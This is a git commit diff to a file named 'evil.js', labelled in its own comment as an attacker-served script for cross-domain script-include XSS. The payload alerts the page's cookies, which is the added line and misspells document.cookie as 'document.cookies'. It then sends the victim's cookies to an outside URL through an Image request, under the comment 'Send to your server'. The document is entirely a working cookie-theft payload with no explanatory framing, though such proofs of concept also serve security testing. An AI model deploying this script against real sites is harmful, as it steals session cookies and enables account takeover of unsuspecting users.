8a1af2667594c82c2136536baab4d46a82114b8b
0xKunAlx0 <49309404+0xKunAlx0@users.noreply.github.com>
2025-05-16 22:36:44 +0530

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,5 +1,6 @@
 // evil.js (served by attacker)
 alert("XSS via Cross-Domain Script Include - KUNAL 💀");
+alert(document.cookies);
 document.cookie = "stolen=" + document.cookie;
 // Send to your server
 new Image().src = "https://www.visiblebody.com/" + encodeURIComponent(document.cookie);
